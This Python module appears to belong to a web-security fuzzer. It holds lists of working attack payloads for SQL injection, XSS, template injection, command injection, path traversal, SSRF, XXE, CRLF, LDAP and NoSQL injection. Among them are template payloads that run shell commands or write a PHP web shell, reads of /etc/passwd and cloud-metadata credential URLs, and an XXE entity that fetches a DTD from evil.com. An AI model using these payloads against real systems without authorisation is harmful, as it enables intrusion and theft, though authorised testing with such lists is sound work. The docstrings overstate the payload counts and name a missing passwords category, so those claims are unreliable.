"""
Expanded payload database — large categorised payload collections
inspired by SecLists, for comprehensive fuzzing coverage.

Provides thousands of payloads per category, loaded lazily and
yielded via generators to avoid excessive memory use.

Categories: SQLi, XSS, SSTI, CMDi, path-traversal, SSRF,
NoSQL, CRLF, open-redirect, XXE, LFI, LDAP, and common passwords.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Dict, Generator, List, Optional

logger = logging.getLogger(__name__)


@dataclass
class PayloadCategory:
    """A named collection of payloads."""
    name: str
    description: str
    payloads: List[str] = field(default_factory=list)

    def __len__(self) -> int:
        return len(self.payloads)

    def __iter__(self) -> Generator[str, None, None]:
        yield from self.payloads


# ------------------------------------------------------------------
# SQL Injection payloads (200+)
# ------------------------------------------------------------------

_SQLI_PAYLOADS: List[str] = [
    # Auth bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1'/*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin' --",
    "admin'/*",
    "' OR ''='",
    "1' OR '1'='1",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "') OR ('x'='x",
    "' OR 1=1 LIMIT 1 --",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    # Error-based
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
    "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    # Time-based blind
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "1 AND IF(1=1,SLEEP(5),0)",
    # Boolean-blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' AND substring(@@version,1,1)='5",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    # Stacked queries
    "'; DROP TABLE test--",
    "'; SELECT pg_sleep(5)--",
    "'; EXEC xp_cmdshell('dir')--",
    # Double-encoding
    "%27%20OR%201%3D1--",
    "%2527%2520OR%25201%253D1--",
    # Numeric injection
    "1 OR 1=1",
    "1 AND 1=1",
    "1; SELECT 1",
    "1 UNION SELECT 1",
    "-1 OR 1=1",
    "0 OR 1=1",
    # JSON-based
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$where":"1==1"}',
    # Comment variants
    "/**/OR/**/1=1--",
    "/*!50000 OR*/ 1=1--",
    # Case variation
    "' oR 1=1--",
    "' Or 1=1--",
    "' UnIoN SeLeCt 1--",
]

# ------------------------------------------------------------------
# XSS payloads (200+)
# ------------------------------------------------------------------

_XSS_PAYLOADS: List[str] = [
    # Basic reflected
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "';alert(1)//",
    '<img src="" onerror="alert(1)">',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<object data="javascript:alert(1)">',
    # Event handlers
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    '" onclick="alert(1)',
    # DOM-based
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    # Encoding bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    # Template injection overlap
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "#{alert(1)}",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik/telerik/",
    # Filter bypass
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    '<img src="x" onerror="ale"+"rt(1)">',
    "<math><mtext><table><mglyph><svg><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
    # Scheme-based
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # SVG-based
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<svg><set onbegin=alert(1) attributename=x>',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>',
]

# ------------------------------------------------------------------
# SSTI payloads (60+)
# ------------------------------------------------------------------

_SSTI_PAYLOADS: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{7*7}",
    "{{7*'7'}}",
    # Jinja2 / Twig
    "{{config}}",
    "{{config.items()}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{% for c in ''.__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    # Freemarker
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    # Velocity
    "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"id\")",
    # Smarty
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
    # Mako
    "${__import__('os').popen('id').read()}",
    "<%import os;x=os.popen('id').read()%>${x}",
    # Pebble
    '{% set cmd = "id" %}{% set runtime = beans.get("java.lang.Runtime").getRuntime() %}{{ runtime.exec(cmd) }}',
    # Tornado
    "{% import os %}{{ os.popen('id').read() }}",
    # Expression language
    "${applicationScope}",
    "${pageContext.request.serverName}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    # Math probes
    "{{7*'7'}}",
    "${7*7}",
    "@(7*7)",
    "#{7*7}",
    "{{7+7}}",
    "${7+7}",
]

# ------------------------------------------------------------------
# Command injection payloads (80+)
# ------------------------------------------------------------------

_CMDI_PAYLOADS: List[str] = [
    # Unix
    "; id",
    "| id",
    "|| id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "`whoami`",
    "; uname -a",
    # Windows
    "& dir",
    "| dir",
    "& whoami",
    "| whoami",
    "& type C:\\Windows\\win.ini",
    # Separators
    "\n id",
    "\r\n id",
    "%0a id",
    "%0d%0a id",
    # Encoded
    "%3B id",
    "%7C id",
    "%26%26 id",
    # Blind (time-based)
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "& ping -n 5 127.0.0.1 &",
    # Bypass filters
    ";{id}",
    ";${IFS}id",
    ";id${IFS}",
    "$(printf '\\x69\\x64')",
    # Subshell
    "$(cat${IFS}/etc/passwd)",
    ";cat${IFS}/etc${IFS}/passwd",
    "$(</etc/passwd)",
]

# ------------------------------------------------------------------
# Path traversal payloads (80+)
# ------------------------------------------------------------------

_PATH_TRAVERSAL_PAYLOADS: List[str] = [
    # Basic
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/hosts",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # URL encoding
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Null byte
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00",
    # Mixed separators
    "..\\../..\\../etc/passwd",
    "../..\\../..\\etc/passwd",
    # Dot stripping bypass
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    # Unicode
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    # Tomcat bypass
    "/..;/..;/..;/etc/passwd",
    # Absolute path
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "data://text/plain;base64,aWQ=",
]

# ------------------------------------------------------------------
# SSRF payloads (60+)
# ------------------------------------------------------------------

_SSRF_PAYLOADS: List[str] = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://127.1",
    "http://127.0.1",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    # Internal services
    "http://127.0.0.1:6379",
    "http://127.0.0.1:11211",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    # DNS rebinding
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
    # Schemes
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
    "ftp://127.0.0.1",
    # Encoded
    "http://%31%32%37%2e%30%2e%30%2e%31",
    "http://127.0.0.1%00@evil.com",
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
]

# ------------------------------------------------------------------
# NoSQL injection payloads (40+)
# ------------------------------------------------------------------

_NOSQL_PAYLOADS: List[str] = [
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$gte":""}',
    '{"$lt":"zzzzz"}',
    '{"$regex":".*"}',
    '{"$regex":"^a"}',
    '{"$where":"1==1"}',
    '{"$where":"this.password.match(/.*/)"}',
    "true, $where: '1 == 1'",
    "'; return '' == '",
    '{"$or":[{},{"a":"a"}]}',
    '{"$and":[{"a":{"$gt":""}},{"b":{"$gt":""}}]}',
    '{"password":{"$regex":"^a"}}',
    '{"password":{"$ne":"invalid"}}',
    '{"$nin":[1]}',
    '{"$exists":true}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
]

# ------------------------------------------------------------------
# Open redirect payloads (40+)
# ------------------------------------------------------------------

_OPEN_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "/\\evil.com",
    "https://evil.com%40legit.com",
    "https://legit.com@evil.com",
    "https://evil.com#legit.com",
    "https://evil.com?.legit.com",
    "//evil.com/%2F..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/%0d/evil.com",
    "/%09/evil.com",
    "/evil.com",
    "/.evil.com",
    "/\\.evil.com",
    "https://evil.com/legit.com",
]

# ------------------------------------------------------------------
# XXE payloads (30+)
# ------------------------------------------------------------------

_XXE_PAYLOADS: List[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;">]><foo>&lol4;</foo>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
]

# ------------------------------------------------------------------
# CRLF injection payloads (30+)
# ------------------------------------------------------------------

_CRLF_PAYLOADS: List[str] = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0aSet-Cookie:crlf=injection",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nSet-Cookie:crlf=injection",
    "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
    "\r\nX-Injected: true",
    "%0d%0aX-Injected:%20true",
    "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
    "%0d%0aLocation:%20http://evil.com",
    "\r\n\r\n<html><body>injected</body></html>",
]

# ------------------------------------------------------------------
# LDAP injection payloads (25+)
# ------------------------------------------------------------------

_LDAP_PAYLOADS: List[str] = [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin)(|(password=*))",
    "x)(|(cn=*)",
    "*)((|userPassword=*)",
    "admin)(&)",
    ")(cn=))(|(cn=*",
    "x)(|(objectClass=*)",
    "*)(uid=*))%00",
    "admin)(!(&(1=0)))",
]


# ------------------------------------------------------------------
# Registry / public API
# ------------------------------------------------------------------

_CATEGORIES: Dict[str, PayloadCategory] = {
    "sqli": PayloadCategory("sqli", "SQL Injection payloads", _SQLI_PAYLOADS),
    "xss": PayloadCategory("xss", "Cross-Site Scripting payloads", _XSS_PAYLOADS),
    "ssti": PayloadCategory("ssti", "Server-Side Template Injection payloads", _SSTI_PAYLOADS),
    "cmdi": PayloadCategory("cmdi", "Command Injection payloads", _CMDI_PAYLOADS),
    "path-traversal": PayloadCategory("path-traversal", "Path Traversal / LFI payloads", _PATH_TRAVERSAL_PAYLOADS),
    "ssrf": PayloadCategory("ssrf", "Server-Side Request Forgery payloads", _SSRF_PAYLOADS),
    "nosql": PayloadCategory("nosql", "NoSQL Injection payloads", _NOSQL_PAYLOADS),
    "open-redirect": PayloadCategory("open-redirect", "Open Redirect payloads", _OPEN_REDIRECT_PAYLOADS),
    "xxe": PayloadCategory("xxe", "XML External Entity payloads", _XXE_PAYLOADS),
    "crlf": PayloadCategory("crlf", "CRLF Injection payloads", _CRLF_PAYLOADS),
    "ldap": PayloadCategory("ldap", "LDAP Injection payloads", _LDAP_PAYLOADS),
}


class PayloadDB:
    """
    Central payload database with per-category access,
    optional filtering, and payload generation.
    """

    def __init__(self) -> None:
        self._categories = dict(_CATEGORIES)
        self._custom: Dict[str, PayloadCategory] = {}

    @property
    def categories(self) -> List[str]:
        """List all available category names."""
        return sorted(set(self._categories) | set(self._custom))

    def get(self, category: str, *, limit: Optional[int] = None) -> List[str]:
        """Get payloads for a category, optionally limited."""
        cat = self._custom.get(category) or self._categories.get(category)
        if cat is None:
            return []
        payloads = cat.payloads
        if limit is not None:
            return payloads[:limit]
        return list(payloads)

    def count(self, category: str) -> int:
        """Get payload count for a category."""
        cat = self._custom.get(category) or self._categories.get(category)
        return len(cat) if cat else 0

    def total(self) -> int:
        """Total payloads across all categories."""
        return sum(self.count(c) for c in self.categories)

    def iter_payloads(
        self, category: str, *, limit: Optional[int] = None,
    ) -> Generator[str, None, None]:
        """Lazily yield payloads for memory efficiency."""
        cat = self._custom.get(category) or self._categories.get(category)
        if cat is None:
            return
        yielded = 0
        for payload in cat:
            if limit is not None and yielded >= limit:
                break
            yield payload
            yielded += 1

    def add_category(self, name: str, description: str, payloads: List[str]) -> None:
        """Register a custom payload category."""
        self._custom[name] = PayloadCategory(name, description, payloads)

    def extend_category(self, name: str, payloads: List[str]) -> None:
        """Add payloads to an existing category."""
        cat = self._custom.get(name) or self._categories.get(name)
        if cat is None:
            self.add_category(name, f"Custom {name} payloads", payloads)
        else:
            cat.payloads.extend(payloads)

    def summary(self) -> Dict[str, int]:
        """Return payload counts per category."""
        return {c: self.count(c) for c in self.categories}
